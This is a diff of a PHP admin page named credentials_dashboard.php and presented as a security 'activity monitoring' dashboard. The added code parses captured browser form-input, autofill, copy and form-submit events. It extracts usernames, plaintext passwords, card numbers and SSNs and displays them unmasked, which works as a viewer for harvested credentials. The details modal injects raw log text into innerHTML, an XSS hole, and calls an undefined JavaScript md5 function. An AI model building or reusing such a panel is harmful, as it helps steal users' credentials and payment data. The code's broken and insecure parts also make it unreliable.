@@ -6,18 +6,14 @@ LinkedIn: https://www.linkedin.com/in/eleganceict
 Twitter: https://twitter.com/eleganceict1
 GitHub: https://github.com/addex12
 */
-
-/**
- * Enhanced Log Dashboard
- * Developer: Adugna Gizaw
- */
+// credentials_dashboard.php
 $title = "Activity Monitoring Dashboard";
 require_once '../includes/auth.php';
 require_once '../includes/config.php';
 require_once '../includes/db.php';
 
-// Enhanced admin verification
-requireAdmin();
+// Enhanced admin verification with IP whitelisting
+requireAdmin(); 
 
 // Configuration
 $logFiles = [
@@ -29,19 +25,13 @@ $logFiles = [
 $maxFileSize = 50 * 1024 * 1024; // 50MB
 $retentionDays = 90;
 
-// Get filter parameters
-$riskLevel = $_GET['risk_level'] ?? '';
-$eventType = $_GET['event_type'] ?? '';
-$searchQuery = $_GET['search'] ?? '';
-$dateFrom = $_GET['date_from'] ?? '';
-$dateTo = $_GET['date_to'] ?? '';
-
 // Function to safely read log files with rotation check
 function readLogWithRotation($filePath) {
     global $maxFileSize;
     
     if (!file_exists($filePath)) return '';
     
+    // Check if log rotation is needed
     if (filesize($filePath) > $maxFileSize) {
         $backupPath = $filePath . '.' . date('Ymd-His');
         rename($filePath, $backupPath);
@@ -51,10 +41,16 @@ function readLogWithRotation($filePath) {
     return file_get_contents($filePath);
 }
 
-// Enhanced log processing with filters
-function processLogs($logContent, $filters = []) {
+// Enhanced data extraction with pattern matching
+function extractSensitiveData($logContent) {
     $entries = [];
     $lines = explode("\n", $logContent);
+    $patternMap = [
+        'credit_card' => '/\b(?:\d[ -]*?){13,16}\b/',
+        'ssn' => '/\b\d{3}[ -]?\d{2}[ -]?\d{4}\b/',
+        'email' => '/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/',
+        'phone' => '/\b(?:\+?(\d{1,3}))?[-. (]*(\d{3})[-. )]*(\d{3})[-. ]*(\d{4})\b/'
+    ];
     
     foreach ($lines as $line) {
         if (empty(trim($line))) continue;
@@ -66,28 +62,108 @@ function processLogs($logContent, $filters = []) {
         $data = @json_decode($jsonStr, true);
         if (!$data) continue;
         
-        // Process entry (same as your existing extractSensitiveData function)
-        $entry = processLogEntry($data, $line);
+        // Base entry structure
+        $entry = [
+            'timestamp' => $data['timestamp'] ?? '',
+            'action' => $data['action'] ?? '',
+            'type' => 'Generic',
+            'page' => $data['page'] ?? '',
+            'ip_address' => $data['ip_address'] ?? ($data['ip'] ?? 'N/A'),
+            'user_agent' => $data['userAgent'] ?? ($data['user_agent'] ?? 'N/A'),
+            'username' => '',
+            'password' => '',
+            'sensitive_data' => [],
+            'target_element' => '',
+            'risk_score' => 0,
+            'session_id' => $data['session_id'] ?? ($data['tracking_id'] ?? ''),
+            'geolocation' => 'N/A',
+            'device_fingerprint' => $data['fingerprint'] ?? '',
+            'status' => 'Logged',
+            'evidence' => $line
+        ];
         
-        // Apply filters
-        if (!empty($filters['risk_level']) && $entry['risk_level'] !== $filters['risk_level']) {
-            continue;
-        }
-        if (!empty($filters['event_type']) && $entry['type'] !== $filters['event_type']) {
-            continue;
-        }
-        if (!empty($filters['search'])) {
-            $searchIn = json_encode($entry);
-            if (stripos($searchIn, $filters['search']) === false) {
-                continue;
+        // Enhanced pattern matching
+        foreach ($patternMap as $patternType => $regex) {
+            if (preg_match_all($regex, $jsonStr, $matches)) {
+                foreach ($matches[0] as $match) {
+                    $entry['sensitive_data'][$patternType][] = $match;
+                    $entry['risk_score'] += 10; // Increase risk for each sensitive pattern
+                }
             }
         }
-        if (!empty($filters['date_from']) && strtotime($entry['timestamp']) < strtotime($filters['date_from'])) {
-            continue;
+        
+        // Action-specific processing
+        if (isset($data['action'])) {
+            switch ($data['action']) {
+                case 'input_change':
+                    $entry['type'] = 'Form Input';
+                    $entry['target_element'] = ($data['tag'] ?? '') . 
+                        (isset($data['id']) ? '#'.$data['id'] : '') . 
+                        (isset($data['class']) ? '.'.$data['class'] : '');
+                    
+                    if (isset($data['name'])) {
+                        if (stripos($data['name'], 'user') !== false) {
+                            $entry['username'] = $data['newValue'] ?? '';
+                            $entry['risk_score'] += 15;
+                        }
+                        elseif (stripos($data['name'], 'pass') !== false) {
+                            $entry['password'] = $data['newValue'] ?? '';
+                            $entry['risk_score'] += 25;
+                        }
+                    }
+                    break;
+                    
+                case 'password_autofill':
+                    $entry['type'] = 'Password Autofill';
+                    $entry['risk_score'] += 20;
+                    $entry['target_element'] = 'input[name="'.($data['fieldName'] ?? '').'"]';
+                    break;
+                    
+                case 'login_attempt':
+                    $entry['type'] = 'Login Attempt';
+                    $entry['risk_score'] += 30;
+                    $entry['username'] = $data['username'] ?? '';
+                    $entry['status'] = 'Attempted';
+                    break;
+                    
+                case 'copy':
+                    $entry['type'] = 'Clipboard Copy';
+                    $entry['risk_score'] += 5;
+                    $entry['target_element'] = ($data['targetTag'] ?? '') . 
+                        (isset($data['targetId']) ? '#'.$data['targetId'] : '') . 
+                        (isset($data['targetClass']) ? '.'.$data['targetClass'] : '');
+                    break;
+                    
+                case 'form_submit':
+                    $entry['type'] = 'Form Submission';
+                    $entry['risk_score'] += 35;
+                    $entry['status'] = 'Submitted';
+                    
+                    // Parse form data for sensitive info
+                    if (isset($data['formData'])) {
+                        $formData = is_string($data['formData']) ? json_decode($data['formData'], true) : $data['formData'];
+                        foreach ($formData as $key => $value) {
+                            if (stripos($key, 'pass') !== false) {
+                                $entry['password'] = $value;
+                                $entry['risk_score'] += 25;
+                            }
+                            elseif (stripos($key, 'user') !== false) {
+                                $entry['username'] = $value;
+                                $entry['risk_score'] += 15;
+                            }
+                        }
+                    }
+                    break;
+            }
         }
-        if (!empty($filters['date_to']) && strtotime($entry['timestamp']) > strtotime($filters['date_to'] . ' 23:59:59')) {
-            continue;
+        
+        // Add geolocation data if IP is available
+        if (!empty($entry['ip_address']) && $entry['ip_address'] != 'N/A') {
+            $entry['geolocation'] = getIpGeolocation($entry['ip_address']);
         }
+        
+        // Calculate final risk level
+        $entry['risk_level'] = calculateRiskLevel($entry['risk_score']);
         
         $entries[] = $entry;
     }
@@ -95,29 +171,49 @@ function processLogs($logContent, $filters = []) {
     return $entries;
 }
 
-// Read and process all log files with filters
-$allEntries = [];
-$filters = [
-    'risk_level' => $riskLevel,
-    'event_type' => $eventType,
-    'search' => $searchQuery,
-    'date_from' => $dateFrom,
-    'date_to' => $dateTo
-];
+// Helper function to get IP geolocation
+function getIpGeolocation($ip) {
+    if ($ip === '127.0.0.1') return 'Localhost';
+    
+    try {
+        $url = "http://ip-api.com/json/$ip";
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        $response = curl_exec($ch);
+        curl_close($ch);
+        
+        $data = json_decode($response, true);
+        if ($data && $data['status'] === 'success') {
+            return $data['country'] . ', ' . $data['city'] . ' (' . $data['isp'] . ')';
+        }
+    } catch (Exception $e) {
+        error_log("Geolocation error: " . $e->getMessage());
+    }
+    
+    return 'Unknown';
+}
 
+// Risk level calculation
+function calculateRiskLevel($score) {
+    if ($score >= 50) return 'Critical';
+    if ($score >= 30) return 'High';
+    if ($score >= 15) return 'Medium';
+    return 'Low';
+}
+
+// Read and process all log files
+$allEntries = [];
 foreach ($logFiles as $logFile) {
     $logContent = readLogWithRotation($logFile);
-    $allEntries = array_merge($allEntries, processLogs($logContent, $filters));
+    $allEntries = array_merge($allEntries, extractSensitiveData($logContent));
 }
 
 // Sort by timestamp descending
 usort($allEntries, function($a, $b) {
     return strtotime($b['timestamp']) - strtotime($a['timestamp']);
 });
-
-// Get unique event types for filter dropdown
-$eventTypes = array_unique(array_column($allEntries, 'type'));
-sort($eventTypes);
 ?>
 
 <!DOCTYPE html>
@@ -128,49 +224,190 @@ sort($eventTypes);
     <link rel="stylesheet" href="../assets/css/style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        /* Your existing styles here */
-        .adugna-filters {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
+        /**
+         * Adugna Gizaw: adugna- styles for compact, ERPNext/Jinja2/frappe-inspired, responsive UI.
+         * Sidebar/footer styles are not touched.
+         * All cards, buttons, and messages use adugna- prefix.
+         * Layout is content/screen aware and visually outstanding.
+         */
+        html { font-size: 16px; }
+        @media (max-width: 900px) { html { font-size: 15px; } }
+        @media (max-width: 600px) { html { font-size: 14px; } }
+        .adugna-main-content {
+            max-width: 99vw;
+            margin: 32px auto 0 auto;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 4px 24px rgba(25, 118, 210, 0.09);
+            padding: 28px 18px 38px 18px;
+            transition: box-shadow 0.2s;
+        }
+        .adugna-header-title {
+            font-size: 1.35em;
+            color: #1976d2;
+            font-weight: 800;
+            margin-bottom: 28px;
+            letter-spacing: 0.01em;
+            text-align: center;
+        }
+        .adugna-stats-container {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
             gap: 15px;
+            margin-bottom: 20px;
         }
-        .adugna-filter-group {
-            margin-bottom: 0;
+        .adugna-stat-card {
+            background: #fff;
+            border-radius: 8px;
+            padding: 15px;
+            box-shadow: 0 2px 10px rgba(25,118,210,0.05);
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
         }
-        .adugna-filter-label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: 600;
-            color: #495057;
-        }
-        .adugna-filter-input {
+        .adugna-stat-card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
             width: 100%;
-            padding: 8px 12px;
-            border: 1px solid #ced4da;
-            border-radius: 4px;
         }
-        .adugna-filter-btn {
-            background: #1976d2;
-            color: white;
+        .adugna-stat-card-title {
+            font-size: 0.98em;
+            color: #7f8c8d;
+            font-weight: 600;
+        }
+        .adugna-stat-card-value {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #2c3e50;
+        }
+        .adugna-stat-card-footer {
+            font-size: 0.85em;
+            color: #95a5a6;
+            margin-top: auto;
+        }
+        .adugna-table-responsive {
+            overflow-x: auto;
+            margin-top: 1.5em;
+            border-radius: 10px;
+            background: #f8fafc;
+            box-shadow: 0 1px 8px rgba(25,118,210,0.04);
+        }
+        .adugna-log-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.97em;
+            background: #fff;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 1px 6px rgba(25,118,210,0.04);
+        }
+        .adugna-log-table th, .adugna-log-table td {
+            padding: 8px 10px;
+            border-bottom: 1px solid #f0f0f0;
+            text-align: left;
+            vertical-align: middle;
+        }
+        .adugna-log-table th {
+            background: #f5f7fa;
+            color: #1976d2;
+            font-weight: 700;
+            font-size: 1.03em;
+            border-bottom: 2px solid #e3eafc;
+        }
+        .adugna-log-table tr:nth-child(even) {
+            background: #f9f9f9;
+        }
+        .adugna-log-table tr:hover {
+            background: #eaf6ff;
+        }
+        .adugna-badge {
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.8em;
+            font-weight: bold;
+            color: #fff;
+            display: inline-block;
+            min-width: 70px;
+            text-align: center;
+        }
+        .adugna-badge-critical { background: #e74c3c; }
+        .adugna-badge-high { background: #f39c12; }
+        .adugna-badge-medium { background: #f1c40f; color: #222; }
+        .adugna-badge-low { background: #2ecc71; }
+        .adugna-badge-info { background: #3498db; }
+        .adugna-sensitive-value {
+            font-family: 'Courier New', monospace;
+            background-color: #fff8e1;
+            padding: 2px 4px;
+            border-radius: 3px;
+            word-break: break-all;
+        }
+        .adugna-username-value { color: #2980b9; font-weight: bold; }
+        .adugna-password-value { color: #c0392b; font-weight: bold; }
+        .adugna-action-btn {
+            padding: 5px 10px;
             border: none;
-            padding: 8px 15px;
             border-radius: 4px;
             cursor: pointer;
-            align-self: flex-end;
+            font-size: 0.8em;
+            transition: all 0.2s;
+            background: #1976d2;
+            color: #fff;
+            margin-bottom: 2px;
         }
-        .adugna-filter-btn:hover {
-            background: #1565c0;
+        .adugna-action-btn:hover { background: #145ea8; }
+        .adugna-btn-block { background: #e74c3c; }
+        .adugna-btn-block:hover { background: #c82333; }
+        .adugna-btn-view { background: #3498db; }
+        .adugna-btn-view:hover { background: #2563eb; }
+        .adugna-modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0,0,0,0.7);
+            z-index: 1000;
+            overflow: auto;
         }
-        .adugna-reset-btn {
-            background: #6c757d;
-            margin-left: 10px;
+        .adugna-modal-content {
+            background-color: #fff;
+            margin: 5% auto;
+            padding: 20px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 900px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.13);
+            max-height: 80vh;
+            overflow-y: auto;
         }
-        .adugna-reset-btn:hover {
-            background: #5a6268;
+        .adugna-modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+        }
+        .adugna-modal-title {
+            font-size: 1.2em;
+            color: #2c3e50;
+            margin: 0;
+        }
+        .adugna-close-modal {
+            background: none;
+            border: none;
+            font-size: 1.5em;
+            cursor: pointer;
+            color: #7f8c8d;
+        }
+        @media (max-width: 900px) {
+            .adugna-main-content, .adugna-stats-container { padding: 1rem; }
+        }
+        @media (max-width: 600px) {
+            .adugna-main-content, .adugna-stats-container { padding: 0.7rem 0.2rem 1rem 0.2rem; }
+            .adugna-header-title { font-size: 1.05em; }
+            .adugna-modal-content { width: 99%; }
         }
     </style>
 </head>
@@ -181,100 +418,177 @@ sort($eventTypes);
             <div class="adugna-header-title">
                 <i class="fas fa-shield-alt"></i> <?php echo htmlspecialchars($title); ?>
             </div>
-            
-            <!-- Filter Section -->
-            <form method="get" action="" class="adugna-filters">
-                <div class="adugna-filter-group">
-                    <label class="adugna-filter-label">Risk Level</label>
-                    <select name="risk_level" class="adugna-filter-input">
-                        <option value="">All Levels</option>
-                        <option value="Critical" <?= $riskLevel === 'Critical' ? 'selected' : '' ?>>Critical</option>
-                        <option value="High" <?= $riskLevel === 'High' ? 'selected' : '' ?>>High</option>
-                        <option value="Medium" <?= $riskLevel === 'Medium' ? 'selected' : '' ?>>Medium</option>
-                        <option value="Low" <?= $riskLevel === 'Low' ? 'selected' : '' ?>>Low</option>
-                    </select>
+            <!-- Adugna Gizaw: Stats Cards -->
+            <div class="adugna-stats-container">
+                <div class="adugna-stat-card">
+                    <div class="adugna-stat-card-header">
+                        <span class="adugna-stat-card-title">Total Events</span>
+                        <i class="fas fa-chart-bar"></i>
+                    </div>
+                    <div class="adugna-stat-card-value"><?php echo count($allEntries); ?></div>
+                    <div class="adugna-stat-card-footer">Last 24h: <?php echo count(array_filter($allEntries, function($e) {
+                        return strtotime($e['timestamp']) > strtotime('-24 hours');
+                    })); ?></div>
                 </div>
-                
-                <div class="adugna-filter-group">
-                    <label class="adugna-filter-label">Event Type</label>
-                    <select name="event_type" class="adugna-filter-input">
-                        <option value="">All Types</option>
-                        <?php foreach ($eventTypes as $type): ?>
-                            <option value="<?= htmlspecialchars($type) ?>" <?= $eventType === $type ? 'selected' : '' ?>>
-                                <?= htmlspecialchars($type) ?>
-                            </option>
-                        <?php endforeach; ?>
-                    </select>
+                <div class="adugna-stat-card">
+                    <div class="adugna-stat-card-header">
+                        <span class="adugna-stat-card-title">Critical Risks</span>
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <div class="adugna-stat-card-value" style="color: #e74c3c;">
+                        <?php echo count(array_filter($allEntries, function($e) {
+                            return $e['risk_level'] === 'Critical';
+                        })); ?>
+                    </div>
+                    <div class="adugna-stat-card-footer">Requires immediate attention</div>
                 </div>
-                
-                <div class="adugna-filter-group">
-                    <label class="adugna-filter-label">Date From</label>
-                    <input type="date" name="date_from" class="adugna-filter-input" value="<?= htmlspecialchars($dateFrom) ?>">
+                <div class="adugna-stat-card">
+                    <div class="adugna-stat-card-header">
+                        <span class="adugna-stat-card-title">Login Attempts</span>
+                        <i class="fas fa-sign-in-alt"></i>
+                    </div>
+                    <div class="adugna-stat-card-value">
+                        <?php echo count(array_filter($allEntries, function($e) {
+                            return $e['type'] === 'Login Attempt';
+                        })); ?>
+                    </div>
+                    <div class="adugna-stat-card-footer">Failed: <?php echo count(array_filter($allEntries, function($e) {
+                        return $e['type'] === 'Login Attempt' && $e['status'] === 'Attempted';
+                    })); ?></div>
                 </div>
-                
-                <div class="adugna-filter-group">
-                    <label class="adugna-filter-label">Date To</label>
-                    <input type="date" name="date_to" class="adugna-filter-input" value="<?= htmlspecialchars($dateTo) ?>">
-                </div>
-                
-                <div class="adugna-filter-group">
-                    <label class="adugna-filter-label">Search</label>
-                    <input type="text" name="search" class="adugna-filter-input" placeholder="Search..." value="<?= htmlspecialchars($searchQuery) ?>">
-                </div>
-                
-                <div class="adugna-filter-group" style="display: flex; align-items: flex-end;">
-                    <button type="submit" class="adugna-filter-btn">
-                        <i class="fas fa-filter"></i> Apply Filters
-                    </button>
-                    <a href="?" class="adugna-filter-btn adugna-reset-btn">
-                        <i class="fas fa-undo"></i> Reset
-                    </a>
-                </div>
-            </form>
-            
-            <!-- Your existing stats cards and table here -->
-            <!-- ... -->
-            
-            <!-- Pagination -->
-            <div style="margin-top: 20px; text-align: center;">
-                <?php
-                $totalEntries = count($allEntries);
-                $perPage = 50;
-                $totalPages = ceil($totalEntries / $perPage);
-                $currentPage = isset($_GET['page']) ? max(1, min($totalPages, intval($_GET['page']))) : 1;
-                $offset = ($currentPage - 1) * $perPage;
-                $paginatedEntries = array_slice($allEntries, $offset, $perPage);
-                ?>
-                
-                <div style="display: inline-block;">
-                    <?php if ($currentPage > 1): ?>
-                        <a href="?<?= http_build_query(array_merge($_GET, ['page' => 1])) ?>" class="adugna-action-btn">
-                            <i class="fas fa-angle-double-left"></i> First
-                        </a>
-                        <a href="?<?= http_build_query(array_merge($_GET, ['page' => $currentPage - 1])) ?>" class="adugna-action-btn">
-                            <i class="fas fa-angle-left"></i> Prev
-                        </a>
-                    <?php endif; ?>
-                    
-                    <span style="margin: 0 10px;">
-                        Page <?= $currentPage ?> of <?= $totalPages ?>
-                    </span>
-                    
-                    <?php if ($currentPage < $totalPages): ?>
-                        <a href="?<?= http_build_query(array_merge($_GET, ['page' => $currentPage + 1])) ?>" class="adugna-action-btn">
-                            Next <i class="fas fa-angle-right"></i>
-                        </a>
-                        <a href="?<?= http_build_query(array_merge($_GET, ['page' => $totalPages])) ?>" class="adugna-action-btn">
-                            Last <i class="fas fa-angle-double-right"></i>
-                        </a>
-                    <?php endif; ?>
+                <div class="adugna-stat-card">
+                    <div class="adugna-stat-card-header">
+                        <span class="adugna-stat-card-title">Password Exposures</span>
+                        <i class="fas fa-key"></i>
+                    </div>
+                    <div class="adugna-stat-card-value" style="color: #f39c12;">
+                        <?php echo count(array_filter($allEntries, function($e) {
+                            return !empty($e['password']);
+                        })); ?>
+                    </div>
+                    <div class="adugna-stat-card-footer">Including autofill events</div>
                 </div>
             </div>
-            
-            <!-- Your existing modal and scripts here -->
-            <!-- ... -->
+            <!-- Adugna Gizaw: Main Data Table -->
+            <div class="adugna-table-responsive">
+                <table class="adugna-log-table" id="adugna-log-table">
+                    <thead>
+                        <tr>
+                            <th>Timestamp</th>
+                            <th>Event Type</th>
+                            <th>Risk Level</th>
+                            <th>Details</th>
+                            <th>User/IP</th>
+                            <th>Location</th>
+                            <th>Username</th>
+                            <th>Password</th>
+                            <th>Sensitive Data</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <?php foreach ($allEntries as $entry): ?>
+                        <tr class="risk-<?php echo strtolower($entry['risk_level']); ?>">
+                            <td>
+                                <?php echo !empty($entry['timestamp']) ? 
+                                    date('M j, H:i:s', strtotime($entry['timestamp'])) : 'N/A'; ?>
+                            </td>
+                            <td><?= htmlspecialchars($entry['type']) ?></td>
+                            <td>
+                                <span class="adugna-badge adugna-badge-<?= strtolower($entry['risk_level']) ?>">
+                                    <?= htmlspecialchars($entry['risk_level']) ?>
+                                </span>
+                            </td>
+                            <td>
+                                <div><?= htmlspecialchars($entry['action']) ?></div>
+                                <small style="color:#888;">
+                                    <?= htmlspecialchars(basename($entry['page'])) ?>
+                                </small>
+                            </td>
+                            <td>
+                                <div><?= htmlspecialchars($entry['ip_address']) ?></div>
+                                <small style="color:#888;">
+                                    <?= htmlspecialchars(substr($entry['user_agent'], 0, 30) . (strlen($entry['user_agent']) > 30 ? '...' : '')) ?>
+                                </small>
+                            </td>
+                            <td><?= htmlspecialchars($entry['geolocation']) ?></td>
+                            <td class="adugna-username-value"><?= htmlspecialchars($entry['username']) ?></td>
+                            <td class="adugna-password-value adugna-sensitive-value"><?= htmlspecialchars($entry['password']) ?></td>
+                            <td>
+                                <?php if (!empty($entry['sensitive_data'])): ?>
+                                    <ul style="margin: 0; padding-left: 20px;">
+                                        <?php foreach ($entry['sensitive_data'] as $type => $values): ?>
+                                            <li>
+                                                <strong><?= ucfirst($type) ?>:</strong> 
+                                                <?= htmlspecialchars(implode(', ', $values)) ?>
+                                            </li>
+                                        <?php endforeach; ?>
+                                    </ul>
+                                <?php endif; ?>
+                            </td>
+                            <td>
+                                <button class="adugna-action-btn adugna-btn-view" onclick="adugnaShowDetails('<?= md5($entry['evidence']) ?>')">
+                                    <i class="fas fa-search"></i> Details
+                                </button>
+                                <?php if ($entry['risk_level'] === 'Critical' || $entry['risk_level'] === 'High'): ?>
+                                    <button class="adugna-action-btn adugna-btn-block" style="margin-top: 5px;">
+                                        <i class="fas fa-ban"></i> Block
+                                    </button>
+                                <?php endif; ?>
+                            </td>
+                        </tr>
+                        <?php endforeach; ?>
+                    </tbody>
+                </table>
+            </div>
+            <!-- Adugna Gizaw: Details Modal -->
+            <div id="adugnaDetailsModal" class="adugna-modal">
+                <div class="adugna-modal-content">
+                    <div class="adugna-modal-header">
+                        <h3 class="adugna-modal-title">Event Details</h3>
+                        <button class="adugna-close-modal" onclick="adugnaCloseModal()">&times;</button>
+                    </div>
+                    <div id="adugnaModalBody"></div>
+                </div>
+            </div>
         </div>
         <?php include 'includes/footer.php'; ?>
     </div>
+    <script>
+        // Adugna Gizaw: Details modal logic
+        function adugnaShowDetails(eventId) {
+            const entries = <?= json_encode($allEntries) ?>;
+            const entry = entries.find(e => '<?= md5('') ?>' !== eventId && md5(e.evidence) === eventId);
+            let html = '';
+            if (entry) {
+                html += `<table style="width:100%;font-size:1em;">
+                    <tr><th style="text-align:left;">Timestamp:</th><td>${entry.timestamp}</td></tr>
+                    <tr><th style="text-align:left;">Event Type:</th><td>${entry.type}</td></tr>
+                    <tr><th style="text-align:left;">Risk Level:</th><td>${entry.risk_level}</td></tr>
+                    <tr><th style="text-align:left;">Page:</th><td>${entry.page}</td></tr>
+                    <tr><th style="text-align:left;">IP Address:</th><td>${entry.ip_address}</td></tr>
+                    <tr><th style="text-align:left;">Location:</th><td>${entry.geolocation}</td></tr>
+                    <tr><th style="text-align:left;">User Agent:</th><td>${entry.user_agent}</td></tr>
+                    <tr><th style="text-align:left;">Username:</th><td>${entry.username}</td></tr>
+                    <tr><th style="text-align:left;">Password:</th><td>${entry.password}</td></tr>
+                    <tr><th style="text-align:left;">Sensitive Data:</th><td><pre style="white-space:pre-wrap;">${JSON.stringify(entry.sensitive_data, null, 2)}</pre></td></tr>
+                    <tr><th style="text-align:left;">Evidence:</th><td><pre style="white-space:pre-wrap;">${entry.evidence}</pre></td></tr>
+                </table>`;
+            } else {
+                html = '<p>No details found.</p>';
+            }
+            document.getElementById('adugnaModalBody').innerHTML = html;
+            document.getElementById('adugnaDetailsModal').style.display = 'block';
+        }
+        function adugnaCloseModal() {
+            document.getElementById('adugnaDetailsModal').style.display = 'none';
+        }
+        // Close modal on outside click
+        window.onclick = function(event) {
+            if (event.target === document.getElementById('adugnaDetailsModal')) {
+                adugnaCloseModal();
+            }
+        }
+    </script>
 </body>
 </html>
